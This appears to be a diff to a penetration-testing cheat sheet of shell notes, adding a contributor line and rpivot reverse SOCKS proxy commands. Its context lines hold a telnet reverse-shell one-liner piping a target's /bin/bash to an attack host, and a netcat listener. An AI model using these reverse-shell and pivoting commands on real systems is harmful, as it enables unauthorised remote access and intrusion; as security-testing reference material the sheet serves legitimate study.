@@ -1,4 +1,5 @@
 # alex <alexbujduveanu>
+#snifer <sniferl4bs>
 
 # To make a FIFO in the file system 
 mknod [name of file] p
@@ -19,4 +20,11 @@ nc -l -n -v -p 443
 
 # On the target machine:
 telnet [attack host] 80 | /bin/bash | telnet [attack host]
+
+#Rpivot is a reverse socks proxy tool that allows you to tunnel traffic via socks proxy
+#Server side
+python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0
+
+#Client side
+python client.py --server-ip <ip> --server-port 9999
 
